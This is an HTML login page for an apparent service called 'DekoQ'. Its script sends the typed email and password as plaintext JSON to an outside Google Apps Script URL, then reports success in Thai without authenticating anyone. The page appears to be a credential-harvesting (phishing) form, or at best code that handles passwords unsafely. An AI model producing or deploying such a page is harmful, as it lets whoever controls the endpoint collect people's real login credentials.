<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DekoQ Login</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #007BFF, #0056b3);
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
      color: white;
      margin-bottom: 1rem;
    }

    .container h1 {
      font-size: 3rem;
      margin: 0;
    }

    .container p {
      font-size: 1.2rem;
      margin-top: 0.5rem;
      margin-bottom: 2rem;
    }

    .login-box {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 400px;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    label {
      font-weight: bold;
      margin-bottom: 0.3rem;
      color: #000;
      text-align: left;
    }

    input[type="email"] {
      padding: 0.8rem;
      padding-left: 1.2rem;
      margin-bottom: 1.2rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      text-align: left;
      font-size: 1rem;
    }

    .password-wrapper {
      position: relative;
      display: flex;
      align-items: center;
    }

    .password-wrapper input {
      width: 100%;
      font-size: 1rem;
      border-radius: 8px;
      padding: 0.8rem 2.5rem 0.8rem 1.2rem;
      border: 1px solid #ccc;
    }

    .toggle-password {
      position: absolute;
      right: 10px;
      background: none;
      border: none;
      padding: 0;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .toggle-password svg {
      width: 20px;
      height: 20px;
      fill: #888;
    }

    button[type="submit"] {
      padding: 0.8rem;
      background: #222;
      color: white;
      border: none;
      font-weight: bold;
      cursor: pointer;
      font-size: 1rem;
      border-radius: 8px;
      margin-top: 1rem;
    }

    button[type="submit"]:hover {
      background: #000;
    }
  </style>
</head>
<body>
  <div>
    <div class="container">
      <h1>DekoQ</h1>
      <p>Welcome!</p>
    </div>
    <div class="login-box">
      <form id="form">
        <label for="email">Username/Email</label>
        <input type="email" id="email" name="email" required placeholder="Value" />

        <label for="password">Password</label>
        <div class="password-wrapper">
          <input type="password" id="password" name="password" required placeholder="Value" />
          <button type="button" class="toggle-password" onclick="togglePassword()">
            <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
              <path d="M572.52 241.4C518.41 163.1 412.79 96 288 96S57.59 163.1 3.48 241.4a32.1 32.1 0 0 0 0 29.2C57.59 348.9 163.21 416 288 416s230.41-67.1 284.52-145.4a32.1 32.1 0 0 0 0-29.2zM288 368c-79.4 0-144-64.6-144-144s64.6-144 144-144 144 64.6 144 144-64.6 144-144 144zm0-224a80 80 0 1 0 80 80 80 80 0 0 0-80-80z"/>
            </svg>
          </button>
        </div>

        <button type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script>
    const form = document.querySelector("#form");
    const scriptURL = "https://script.google.com/macros/s/AKfycbx9dmqEKmDTZSwoABl4h8WjTCFU2BMBYjo0atbklk863llEB7-zGpS1qDgF3o2XcgRm5A/exec";

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const email = form.email.value;
      const password = form.password.value;

      fetch(scriptURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      })
        .then(response => {
          alert("ส่งข้อมูลสำเร็จแล้ว!");
          form.reset();
        })
        .catch(error => {
          alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
          console.error("Error!", error.message);
        });
    });

    function togglePassword() {
      const passwordInput = document.getElementById("password");
      const eyeIcon = document.getElementById("eyeIcon");
      const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
      passwordInput.setAttribute("type", type);

      // เปลี่ยนเป็นตาเปิดหรือปิดตามสถานะ
      if (type === "password") {
        eyeIcon.innerHTML = `<path d="M572.52 241.4C518.41 163.1 412.79 96 288 96S57.59 163.1 3.48 241.4a32.1 32.1 0 0 0 0 29.2C57.59 348.9 163.21 416 288 416s230.41-67.1 284.52-145.4a32.1 32.1 0 0 0 0-29.2zM288 368c-79.4 0-144-64.6-144-144s64.6-144 144-144 144 64.6 144 144-64.6 144-144 144zm0-224a80 80 0 1 0 80 80 80 80 0 0 0-80-80z"/>`;
      } else {
        eyeIcon.innerHTML = `<path d="M634.87 469.14l-86.27-67.2A335.56 335.56 0 0 0 640 256c-49.9-77.1-159.1-160-288-160a325.78 325.78 0 0 0-121.17 24.27L39.13 10.34A16 16 0 0 0 17.14 34l588.73 458.8a16 16 0 0 0 22.99-23.66zM320 400c-74.56 0-142.73-32.37-192.27-84.25l41.6-32.45C199 312.35 242.17 336 288 336a144 144 0 0 0 123.44-71.09l38.54 30.03A207.62 207.62 0 0 1 320 400z"/>`;
      }
    }
  </script>
</body>
</html>
